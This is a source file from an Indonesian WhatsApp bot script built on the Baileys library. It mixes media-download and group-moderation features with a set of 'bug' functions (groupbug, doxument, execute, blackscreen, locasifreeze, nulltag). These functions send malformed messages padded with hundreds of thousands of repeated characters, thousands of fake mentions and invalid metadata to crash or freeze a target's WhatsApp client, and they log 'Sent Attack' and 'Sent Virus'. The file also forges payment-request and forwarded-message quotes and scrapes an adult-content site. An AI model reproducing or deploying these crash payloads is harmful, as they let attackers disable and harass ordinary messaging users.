/* 
==================================================================== |
  -[ ! ]- DILARANG KERAS MENYEBAR SCRIPT INI SECARA GRATIS
  -[ ! ]- LU NYEBAR? GUA SUMPAHIN JADI YATIM PIATU REZEKI  NYA SERET
  
  #- Made By Xinnine
   WhatsApp : wa.me/+6281937707120
   Telegram  t.me/htmlxin
   Telegram 2 ( Limit ) : t.me/xinnr9
  #- Base By Devorsixcore
  
  Big Thanks To :
  - Caywyzz ( Help On Giving JS Modificate Functions & Button Cases )
  - Skyzo ( Help Making VPS - DO Function & Case )
  - Remonvoid ( Help Give Tool - Search Cases & Menu Inspirations )
  - Byxx ( Help Give Bug Functions )
  - Devorsixcore ( Base Of The Script )
=================================================================== |
*/
require('./config')
const {
	xinConnect,
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys")
const fs = require('fs')
const path = require('path');
const jimp = require('jimp');
const chalk = require('chalk');
const yts = require('yt-search');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const ytdl = require("@vreden/youtube_scraper")
const os = require('os');
const pino = require('pino');
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const JsConfuser = require('js-confuser');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const axios = require('axios')
const util = require('util')
const { pinterest, pinterest2, remini, mediafire, tiktokDl , spotifyDl , searchSpotifyTracks, convertAngka , tiktokSearchVideo, text2img, listModels, getModels, listSampler, pickRandom, getJobs, rsz } = require('./gudang/lib/scraper');

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
//=================================================//
module.exports = xin = handler = async (xin, m, chatUpdate, store) => {
	try {
	
		const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./gudang/lib/myfunc.js');
		const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./gudang/lib/converter');
		const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./gudang/lib/uploader');
    //=================================================//
		var body = (
			m.mtype === 'conversation' ? m.message.conversation :
			m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
			m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
			m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
			m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
			m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
			m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
			m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
			m.mtype === 'messageContextInfo' ?
			m.message.buttonsResponseMessage?.selectedButtonId ||
			m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
			m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
			m.text :
			''
			);
		if (body == undefined) { body = '' };
		var budy = (typeof m.text == "string" ? m.text : "");
    //=================================================//
		//command
		
		const prefixRegex = /[.!#÷×/]/;
		const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : null;
		const isCmd = prefix ? body.startsWith(prefix) : false;
		const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';		
		const args = budy.trim().split(/ +/).slice(1);
		const q = text = args.join(' ')

		// Individual
		const makeid = crypto.randomBytes(3).toString('hex')
		const contacts = JSON.parse(fs.readFileSync("./gudang/database/ctcs.json"))
		const botNumber = await xin.decodeJid(xin.user.id)
		const pushname = m.pushName || "No Name";
		const senderNumber = m.sender.split('@')[0];	
		const owners = JSON.parse(fs.readFileSync("./gudang/database/own.json"))
		const itsMe = m.sender == botNumber;
		const isOwner = [botNumber.split('@')[0], ...global.owner].includes(m.sender.split("@")[0]) ? true : owners.includes(m.sender) ? true : false
			
		if (!xin.public) {
			if (!m.fromMe && !isOwner) return;
		};

		// Group
       const remoteJid = m.key.remoteJid
       const itil = String.fromCharCode(8206)
	   const readmore = itil.repeat(4001)
		const isGroup = m.chat.endsWith('@g.us');
		const groupMetadata = isGroup ? await xin.groupMetadata(m.chat).catch(e => {}) : '';
		const groupName = isGroup ? groupMetadata.subject : '';
		const groupMembers = isGroup ? groupMetadata.participants : '';
		const groupAdmins = isGroup ? await getGroupAdmins(groupMembers) : '';
		const isBotAdmin = isGroup ? groupAdmins.includes(botNumber + '@s.whatsapp.net') : false;
		const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
		const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
		const groupOwner = isGroup ? groupMetadata.owner : '';
		const prem = JSON.parse(fs.readFileSync('./gudang/database/prem.json'))		
		const isPrem = prem.includes(m.sender)
		const reseller = JSON.parse(fs.readFileSync('./gudang/database/reseller.json'))		
		const isReseller = reseller.includes(m.sender)
		const resdo = JSON.parse(fs.readFileSync('./gudang/database/resellersubdo.json'))		
		const isReDomain = resdo.includes(m.sender)
		const isGroupOwner = isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false;

		//msg & imgs
		const isMedia = (m.type === 'imageMessage' || m.type === 'videoMessage')
		const fatkuns = (m.quoted || m)
		const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
		const qmsg = (quoted.msg || quoted)
		const mime = qmsg.mimetype || "";
	
	// menu random vids //
	const vid = fs.readFileSync('./gudang/vds/videoelxin.mp4')
	const vid2 = fs.readFileSync('./gudang/vds/videoelxin2.mp4')
	
	// menu rando auds //
	const evj = fs.readFileSync('./gudang/auds/q.mp3')
	const evj2 = fs.readFileSync('./gudang/auds/x.mp3')
	const evjlast = fs.readFileSync('./gudang/auds/w.mp3')
	
	// banner random //
	const bnr1 = fs.readFileSync('./gudang/imgs/banner/banner.jpg')
	const bnr2 = fs.readFileSync('./gudang/imgs/banner/banner2.jpg')
	const bnr3 = fs.readFileSync('./gudang/imgs/banner/banner3.jpg')
	const bnr4 = fs.readFileSync('./gudang/imgs/banner/x.jpg')
	const P1 = fs.readFileSync('./gudang/imgs/banner/0.jpg')
	
	// pdf randoms //
	const wing = fs.readFileSync('./gudang/imgs/gepeng/r.jpg')
	const wing2 = fs.readFileSync('./gudang/imgs/gepeng/o.png')
	const wing3 = fs.readFileSync('./gudang/imgs/gepeng/B.png')
	    // qr rando imgs //
	    
	   const py = fs.readFileSync('./gudang/imgs/qr.jpeg')
	   
	   // get randoms //
	    const prandom = [wing, wing2, wing3]
	    let prandoms = Math.floor(Math.random() * prandom.length)
		const audsrnd = [evj, evj2, evjlast]
		let audrnd = Math.floor(Math.random() * audsrnd.length)
		const vidrnd = [vid, vid2]
		let vdsrnd = Math.floor(Math.random() * vidrnd.length)
		const bnrrando = [bnr1, bnr2, bnr3, bnr4]
		let bnrrndm = Math.floor(Math.random() * bnrrando.length)
		
		// end randoms //
		const A1 = audsrnd[audrnd]
		const G1 = vidrnd[vdsrnd]
		const B1 = bnrrando[bnrrndm]
		const X1 = prandom[prandoms]
		// dll !! //
if (m.isGroup && global.antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isOwner && !isAdmins && isBotAdmins && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await xin.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await xin.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kami saya hapus ya, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await xin.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
//await xin.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}

// R34 //
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
		// pp for QC //
		
           let ppuser
           try {
           ppuser = await xin.profilePictureUrl(m.sender, 'image')
           } catch (err) {
           ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
           }

	
		// Play //
				const YouTubeMp3 = async (Link, Quality = 128) => {
			try {
				if (!isUrl(Link)) return m.reply("Cekk tulisan kamu, itu salah!")
				let data = await ytdl.ytmp3(Link, Quality);
				await xin.sendMessage(m.chat, {
					audio: {
						url: data.download.url
					},
					mimetype: 'audio/mpeg',
					contextInfo: {
						forwardingScore: 9999999,
						isForwarded: true,
						externalAdReply: {
							title: `乂 YTMP3 - ${data.download.quality}`,
							body: data.metadata.title,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							thumbnailUrl: data.metadata.thumbnail,
							sourceUrl: Link
						}
					}
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command);
			}
		};

	
		// dll //
				const YouTubeMp4 = async (Link, Quality = 360) => {
			try {
				if (!isUrl(Link)) return ReplyX("Mana link nya?")
				let data = await ytdl.ytmp4(Link, Quality);
				const caption = `*${data.metadata.title}*

*⌬ Ext* : Download
*⌬ ID* : ${data.metadata.videoId}
*⌬ Durasi* : ${data.metadata.timestamp}
*⌬ Upload* : ${data.metadata.ago}
*⌬ Views* : ${data.metadata.views}
*⌬ Quality* : ${data.download.quality}
*⌬ Channel* : ${data.metadata.author.name}

© Xinbot `;

				await xin.sendMessage(m.chat, {
					video: {
						url: data.download.url
					},
					caption: caption,
					gifPlayback: false
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command);
			}
		};
 // VTEX FNC //
 async function groupbug() {
  try {
    const messsage = {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: { degreesLatitude: 0, degreesLongitude: 0 },
              hasMediaAttachment: true,
            },
            body: { text: "Hay🌷😘" + "@1".repeat(295000) },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "1@newsletter", groupSubject: " xCeZeT " },
              ],
            },
          },
        },
      },
    };

    await xin.relayMessage(m.key.remoteJid, messsage, {
      messageId: "ABCDEF1234567890",
    });
  } catch (err) {
    console.log(err);
  }
}

		async function doxument(bugtarg, ptcp = true) {
			let etc = generateWAMessageFromContent(bugtarg,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "500000000",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "hi bro 🌷",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: "",
									},
									hasMediaAttachment: true
								},
								body: {
									text: "LuBauTitit" + "~@0~".repeat(34000),
								}
							}
						}
					}
				}), {
					userJid: bugtarg,
					quoted: ctt
				}
			);

			await xin.relayMessage(bugtarg, etc.message, ptcp ? {
				participant: {
					jid: bugtarg
				}
			} : {});
			console.log(chalk.green("Xinbot | Sent Attack 🌷"));
		}; 
		
		        async function execute(bugtarg, ptcp = false) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "@0".repeat(90000),
            url: "@1".repeat(55000),
            mentionedJid: [
								"0@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: B1
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(bugtarg, locationMessageContent, { userJid: bugtarg });

    await xin.relayMessage(bugtarg, encryptedMessage.message, { participant: { jid: bugtarg } });
};

		async function blackscreen(bugtarg, ptcp = false) {
			await xin.relayMessage(bugtarg, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "hai bro" + "\u0000".repeat(900000)
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {
				participant: {
					jid: bugtarg
				}
			});
			let xfake = fs.readFileSync('./gudang/imgs/fake.webp')
			await xin.sendMessage(bugtarg, {
				sticker: xfake
			}, {
				quoted: marker
			})
			console.log(chalk.green("Xinbot Sent Attack 🌷"));
		};
		
		
 async function locasifreeze(bugtarg, ptcp = false) {
    await xin.relayMessage(bugtarg, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐗̈́͢𝐢ܑܑ𝐧ܑ͙͢𝐖̽𝐚͖̽𝐬̽͜𝐇𝐞͙̟̽̽𝐫𝐞̭̽" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: bugtarg } }, { messageId: null });
}

 		async function nulltag(bugtarg, ptcp = false) {
			await xin.relayMessage(bugtarg, {
					extendedTextMessage: {
						text: "‎Killed By Xin\n" + " *~@0~* ".repeat(30000),
						contextInfo: {
							mentionedJid: [
								"0@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: bugtarg,
							conversionSource: " p ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 30,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " p ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " p "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "̟",
								body: "̟",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " p ",
								sourceId: " p ",
								sourceUrl: "p",
								mediaUrl: "p",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "p"
							},
							groupSubject: " p ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " p ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " p ",
								utmCampaign: " p "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " p ",
								contentType: "UPDATE",
								accessibilityText: " p "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: bugtarg
					}
				} : {}
			);
			console.log(chalk.green("Xinbot Sent Virus ✅"));
		};
        //quoted
        
      		const xreply = async (teks) => {
			return xin.sendMessage(m.chat, {
				contextInfo: {
					mentionedJid: [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map((x) => x[1]).filter((x) => !isNaN(parseInt(x))).map((x) => x + "@s.whatsapp.net"),
				isForwarded: true, 
                forwardingScore: 9999, 
                businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `© Xinbot – XcZ`, newsletterJid: global.idCH }, 
					externalAdReply: {
						showAdAttribution: false,
						renderLargerThumbnail: false,
						title: `𝐗𝐢𝐧 ᝄ `,
						body: `© Powered By Xinn <!>`,
						previewType: "VIDEO",
						thumbnail: bnr3,
						sourceUrl: `https://t.me/htmlxin`,
						mediaUrl: `https://t.me/htmlxin`
					}
				},
				text: teks
			}, {
				quoted: qpayment
			})
		}
	
		// ⏰ //
		
		const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
		let ucapanWaktu;
		if (time >= "19:00:00" && time < "23:59:00") {
			ucapanWaktu = "Selamat Malam 🌌";
		} else if (time >= "15:00:00" && time < "19:00:00") {
			ucapanWaktu = "Selamat Sore 🌇";
		} else if (time >= "11:00:00" && time < "15:00:00") {
			ucapanWaktu = "Selamat Siang 🏞️";
		} else if (time >= "06:00:00" && time < "11:00:00") {
			ucapanWaktu = "Selamat Pagi 🌁";
		} else {
			ucapanWaktu = "Masih Subuh! 🌆";
		}
		const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z");
		const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z");
		const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z");
		const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
		let d = new Date();
		let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime();
		let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5];
		let week = d.toLocaleDateString("id", { weekday: "long" });
		let calendar = d.toLocaleDateString("id", {
			day: "numeric",
			month: "long",
			year: "numeric"
		});		
		
	// Fake Quoted //
	const xpaytod = (teks) => {
			var paymentod = {
				requestPaymentMessage: {
					currencyCodeIso4217: 'IDR',
					amount1000: 9000000 * 1000,
					requestFrom: m.sender,
					noteMessage: {
						extendedTextMessage: {
							text: teks,
							contextInfo: {
								mentionedJid: [],
								groupMentions: [],
								isForwarded: true,
								fromMe: false,
								forwardedNewsletterMessageInfo: {
									newsletterJid: '120363333509194874@newsletter',
									newsletterName: " © Xin V1.6 ",
									serverMessageId: -1
								},
								externalAdReply: {
									showAdAttribution: true
								}
							}
						}
					}
				}
			}
			xin.relayMessage(m.chat, paymentod, {})
		}
            		const excz = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: "",
					itemCount: `0`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `🔴 Xinbots Runtime: ${runtime(process.uptime())}`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		    
		    async function newReply(teks, options = {}) {
			xin.sendMessage(m.chat, {
				document: fs.readFileSync('./gudang/imgs/x.pdf'),
				fileName: `🔴 Active For ${runtime(process.uptime())}`,
				mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
				fileLength: 191882820,
				pageCount: 10101983,
				jpegThumbnail: X1,
				description: 'Xinbot Ror',
				caption: teks,
				...options
			}, {
				quoted: qmime
			});
		}
		
		
		const ctt = {
			key: {
				remoteJid: '0@s.whatsapp.net', 
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				contactMessage: {
					displayName: (pushname),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
				}
			}
		};
      const qbugz = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `t.me/htmlxin`,jpegThumbnail: ""}}}
      
      const qmime = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Xinbot By Xin`,jpegThumbnail: await rsz(B1, 200, 200) }}}
      
      const qctc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `SC XINBOT BY t.me/htmlxin`,jpegThumbnail: ""}}}
      
        const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso8583: "BRL", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Xinbot | t.me/htmlxin"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 7777, currencyCode: "BRL"}}}}
        
